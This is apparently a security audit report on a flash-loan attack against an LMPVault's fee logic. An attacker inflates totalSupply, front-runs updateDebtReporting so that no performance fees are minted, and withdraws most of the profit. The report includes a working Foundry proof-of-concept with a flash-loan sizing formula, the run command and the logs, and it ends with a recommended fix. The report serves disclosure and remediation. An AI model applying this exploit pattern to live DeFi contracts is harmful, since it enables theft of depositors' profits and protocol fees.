# Attacker Can Steal generated Profit & performance fees, due to attacker controlled totalSupply() usage in _collectFees

## Summary
```solidity
function _updateDebtReporting(address[] memory _destinations) private {

uint256 nDest = _destinations.length;

prevNTotalDebt += totalDebtDecrease;

afterNTotalDebt += totalDebtIncrease;

....

// Persist our change in idle and debt
....

_collectFees(idle, debt, totalSupply()); /// @audit < here

}
```

totalSupply() can always be increase by attacker for a transaction using flashloans. Which makes the \_collectFees() function to not perform as intended leading to loss of some profit and all performanceFees.

## Vulnerability Detail

To understand the vulnerability better, we'll run through 2 scenarios, one with attacker manipulation and other a normal one.
LMPVault has 10 weth in debt and has 1 weth in idle and navPerShareHigh is 10000(default). Suppose the destVault generated 1% profit(0.1 weth). now in normal scenario
updateDebtReporting would be called by bots which will eventually call \_collectFees()
which calculates currentNavPerShare by the given formula-
```solidity
uint256 currentNavPerShare = ((idle + debt) * MAX_FEE_BPS) / totalSupply;
```
so currentNavPerShare = (1 + 10.1) ether \* 10000 / 11 ether = 10090 > 10000
now the following conditional is checked & satisfied

```solidity
if (currentNavPerShare > effectiveNavPerShareHighMark) {
// minting fee shares according to nav change
}

```

and everything works correctly. Now assume alice the attacker front runs the bot's original updateDebtReporting by a txn from her malicious contract. The malicious contract basically does the following-
1. It calculates flashLoan amount to take to using the formula 
**flashloanAmount = currentDebtOfLmpVault \* profitPercentage \* 100**
2. so in our case flashloanAmount = 10 \* 1 \* 100 = 1000 weth which she takes from balancer
3. In the flashloan callback she deposits 1000 weth in LMPVault and then calls the updateDebtReporting which will call \_collectFees()

But this time -
currentNavPerShare = (1001 + 10.1) eth \* 10000 / 1011 eth = 10000.98 = 10000 in solidity.And hence the above mentioned 'if conditional' will not be statisfied and no fees will be collected.
Now since alice is the major share holder of vault, she will withdraw , get most of the profit and repay her flashloan.

Working poc - 
```solidity
function test_Steal_Profit2() public {

uint idleAmount = 1 ether;

uint debtAmount = 10 ether;

uint totalAmount = idleAmount + debtAmount;

// 1 - 100, natural numbers only for simplicity

uint profitPercen = 1;

// the formula which gives flashloan amount needed

// to steal some profit by making sure that currentNav = navHighMark in _collectFees()

// and also no shares for fees will be minted to protocol

uint256 flashloanAmt = profitPercen*debtAmount * 100;

emit log_named_uint("Flashloan amt",flashloanAmt);

_accessController.grantRole(Roles.SOLVER_ROLE, address(this));

_accessController.grantRole(Roles.LMP_FEE_SETTER_ROLE, address(this));

// Setting a sink

address feeSink = vm.addr(555);

_lmpVault.setFeeSink(feeSink);

_lmpVault.setPerformanceFeeBps(2000); // 20%

  

// alice the attacker

address alice = address(7891);

_asset.mint(address(this),totalAmount);

_asset.approve(address(_lmpVault),totalAmount);

// deposit by LPs

uint shareBal = _lmpVault.deposit(totalAmount , address(this));

  

// rebalancing happens

_underlyerOne.mint(address(this),debtAmount /2 );

_underlyerOne.approve(address(_lmpVault), debtAmount /2 );

_lmpVault.rebalance(

address(_destVaultOne),

address(_underlyerOne), // tokenIn

debtAmount/2 ,

address(0), // destinationOut, none when sending out baseAsset

address(_asset), // baseAsset, tokenOut

debtAmount

);

// newPrice to represent profit

// 2 ether was starting price

uint256 newPrice = 2 ether +((2 ether * profitPercen) / 100);

_mockRootPrice(address(_underlyerOne),newPrice);

// attack begins, flashLoan by alice

_asset.mint(alice, flashloanAmt);

vm.startPrank(alice);

_asset.approve(address(_lmpVault), flashloanAmt);

uint aliceShares = _lmpVault.deposit(flashloanAmt, alice);

uint navPerShareHighMarkPrev = _lmpVault.navPerShareHighMark();

_lmpVault.updateDebtReporting(_destinations);

uint navPerShareHighMarkCurr = _lmpVault.navPerShareHighMark();

_lmpVault.redeem(aliceShares,alice,alice);

//repays the flashloan

_asset.burn(alice,flashloanAmt);

assertEq(navPerShareHighMarkCurr, navPerShareHighMarkPrev, "Making sure the navHigh didnt change");

assertEq(_lmpVault.balanceOf(feeSink),0,"Making sure no fees collected");

emit log_named_uint("Alice's profit", _asset.balanceOf(alice));

vm.stopPrank();

}
```

add it in LMPVault-Withdrawal.t.sol file under the LMPVaultMintingTests contract and run using the command
```solidity
forge test --match-path test/vault/LMPVault-Withdraw.t.sol --match-test test_Steal_Profit2 -vv
```

Logs:
  Flashloan amt: 1000000000000000000000
  Alice's profit: 98911968348170128

you can play around with it by changing the idleAmount,debtAmount and profitPercen(only natural number < 100).
## Impact

Loss of all generated profit for users and performance fees for protocol. 
Some things to keep in mind for this vuln 
1. WalletLimit is useless and does not prevent the attack as attacker can split the flashloan funds into 'babyContracts' . 
2. totalSupply limit might prevent it, but new vaults with 11 eth in value having a totalSupply limit of 100 eth(182k usd) is unrealistic, usually they will have either no supply limit or very high like 1 million usd value at least.
3. Also attacker does not need to know the exact ProfitPercentage he can overestimate it as long as flashloanAmt <= totalSupplyLimit.
4. The formula I gave is purely by intuition and hit & trial but works for most cases.

## Tool used

Manual Review

## Recommendation

A quick fix would be to make updateDebtReporting a privileged function like others which call \_collectFees() to ensure no flash loan manipulation
